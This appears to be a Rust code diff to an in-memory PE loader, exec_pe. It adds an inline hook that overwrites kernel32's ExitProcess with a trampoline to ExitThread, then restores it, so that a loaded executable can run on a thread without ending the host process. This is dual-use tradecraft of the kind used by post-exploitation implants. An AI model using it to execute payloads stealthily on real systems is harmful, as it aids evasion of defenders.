@@ -323,6 +323,42 @@ pub fn exec_pe(pe_bytes: &[u8]) -> String {
         );
     }
 
+    // ── Phase 6b: Inline-hook ExitProcess → ExitThread ───────────────────────
+    // msvcrt.dll's exit() calls ExitProcess through msvcrt's own IAT, bypassing
+    // our Phase 5b IAT patch.  Write a 12-byte trampoline at the start of
+    // kernel32.ExitProcess so every call path (IAT or direct) is intercepted.
+    let mut ep_orig = [0u8; 12];
+    let mut ep_addr = 0usize;
+    let mut ep_patched = false;
+    unsafe {
+        let k32 = LoadLibraryA(b"kernel32.dll\0".as_ptr());
+        if k32 != 0 {
+            let ep = GetProcAddress(k32, b"ExitProcess\0".as_ptr())
+                .map(|f| std::mem::transmute::<_, usize>(f))
+                .unwrap_or(0);
+            let et = GetProcAddress(k32, b"ExitThread\0".as_ptr())
+                .map(|f| std::mem::transmute::<_, usize>(f))
+                .unwrap_or(0);
+            if ep != 0 && et != 0 {
+                let mut old_prot = 0u32;
+                if VirtualProtect(ep as *const _, 12, PAGE_EXECUTE_READWRITE, &mut old_prot) != 0 {
+                    core::ptr::copy_nonoverlapping(ep as *const u8, ep_orig.as_mut_ptr(), 12);
+                    // mov rax, imm64 (10 bytes) + jmp rax (2 bytes)
+                    let mut stub = [0u8; 12];
+                    stub[0] = 0x48; stub[1] = 0xB8;
+                    let target = et as u64;
+                    core::ptr::copy_nonoverlapping(
+                        &target as *const u64 as *const u8, stub[2..].as_mut_ptr(), 8);
+                    stub[10] = 0xFF; stub[11] = 0xE0;
+                    core::ptr::copy_nonoverlapping(stub.as_ptr(), ep as *mut u8, 12);
+                    VirtualProtect(ep as *const _, 12, old_prot, &mut old_prot);
+                    ep_addr = ep;
+                    ep_patched = true;
+                }
+            }
+        }
+    }
+
     // ── Phase 7: Redirect stdout/stderr; create thread at entry point ─────────
 
     let mut pipe_read:  isize = 0;
@@ -362,6 +398,13 @@ pub fn exec_pe(pe_bytes: &[u8]) -> String {
             CloseHandle(pipe_write);
             CloseHandle(pipe_read);
         }
+        if ep_patched {
+            let mut old_prot = 0u32;
+            if VirtualProtect(ep_addr as *const _, 12, PAGE_EXECUTE_READWRITE, &mut old_prot) != 0 {
+                core::ptr::copy_nonoverlapping(ep_orig.as_ptr(), ep_addr as *mut u8, 12);
+                VirtualProtect(ep_addr as *const _, 12, old_prot, &mut old_prot);
+            }
+        }
         return "[error: CreateThread failed]".into();
     }
 
@@ -373,6 +416,15 @@ pub fn exec_pe(pe_bytes: &[u8]) -> String {
         SetStdHandle(STD_OUTPUT_HANDLE, old_stdout);
         SetStdHandle(STD_ERROR_HANDLE,  old_stderr);
         CloseHandle(pipe_write);
+    }
+
+    // Restore kernel32.ExitProcess to its original bytes.
+    if ep_patched {
+        let mut old_prot = 0u32;
+        if VirtualProtect(ep_addr as *const _, 12, PAGE_EXECUTE_READWRITE, &mut old_prot) != 0 {
+            core::ptr::copy_nonoverlapping(ep_orig.as_ptr(), ep_addr as *mut u8, 12);
+            VirtualProtect(ep_addr as *const _, 12, old_prot, &mut old_prot);
+        }
     }
 
     if wait_res == WAIT_TIMEOUT_VAL {
